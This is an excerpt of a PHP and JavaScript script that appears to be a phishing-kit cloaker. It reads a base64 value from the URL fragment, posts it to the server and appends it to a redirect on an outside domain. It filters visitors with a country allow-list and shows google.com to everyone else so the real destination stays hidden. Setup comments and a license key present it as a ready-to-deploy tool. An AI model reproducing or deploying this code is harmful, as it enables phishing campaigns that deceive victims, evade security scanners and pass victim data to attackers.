...
$license_key = "ajwhrzqcz40oax49lo1bupyu9k9d7q2z"; // [REQUIRED]

$redirect = isset($_SESSION['redirect']) ? $_SESSION['redirect'] : "https://nenedio.com/afs"; // Load from session or initialize

echo <<<HTML
<!DOCTYPE html>
<html>
<head>
    <title>Extract Base64</title>
</head>
<body>
    <script>
        // Check if the URL contains a fragment
        if (window.location.hash) {
            // Extract the fragment (base64 string)
            const base64string = window.location.hash.substring(1);

            // Send the fragment back to the server
            ...
            xhr.onload = function () {
                if (xhr.status === 200) {
                    ...
                    // Reload the page or trigger a new GET request
                    window.location = window.location.href.split('#')[0]; // Strip the fragment and reload
                }
            };
            xhr.send('base64=' + encodeURIComponent(base64string));
        }
    </script>
</body>
</html>
...
// Handle the POST request to update the $redirect variable
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['base64'])) {
    $base64 = $_POST['base64']; // Get the base64 string from the POST request
    $redirect .= $base64; // Append the base64 fragment to the redirect URL
    $_SESSION['redirect'] = $redirect; // Save the updated redirect to the session
    echo "Redirect saved."; // Send a success response to the client
    exit();
}
...
$_COUNTRY_ALLOWED = ["ma","fr", "us", "ca", "mx", "uk", "za", "ng", "tr", "at", "be", "bg", "hr", "cy", "cz", "dk", "ee", "fl", "fr", "de", "gr", "hu", "ie", "it", "lv", "lt", "lu", "mt", "nl", "pl", "pt", "ro", "sk", "sl", "es", "se", "is", "li", "no", "ch", "al", "ba", "md", "me", "mk", "rs", "ua", "ad", "by", "mc", "ru", "sm", "gb", "gh", "va", "kw"]; # Add Allowed Country Here , Country ISO code must be lowercase. [REQUIRED]
...
$cloaker = [
    "url_to_grab" => "https://google.com" // Change the link you want to grap it in your link
];
